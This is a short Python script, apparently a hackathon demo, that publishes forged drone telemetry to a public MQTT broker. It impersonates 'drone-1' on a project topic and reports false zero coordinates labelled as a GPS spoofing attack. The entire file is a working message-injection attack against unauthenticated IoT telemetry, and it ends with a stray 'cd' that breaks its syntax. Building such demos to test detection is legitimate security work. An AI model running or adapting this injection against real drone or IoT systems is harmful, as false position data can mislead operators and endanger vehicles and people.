import json
import paho.mqtt.client as mqtt

def inject_gps_spoofing(drone_id="drone-1"):
    """Publishes a malicious payload pretending to be the target drone."""
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
    client.connect("broker.hivemq.com", 1883, 60)
    
    topic = f"devjams_gayathri_drones/{drone_id}/telemetry"
    spoofed_payload = {
        "drone_id": drone_id,
        "lat": 0.0000,  # Teleports drone to Equator
        "lon": 0.0000,
        "battery": 99.0,
        "attack": "GPS_SPOOF"
    }
    
    client.publish(topic, json.dumps(spoofed_payload))
    print(f"🚨 INJECTED GPS SPOOFING ATTACK on target: {drone_id}")

if __name__ == "__main__":
    inject_gps_spoofing()cd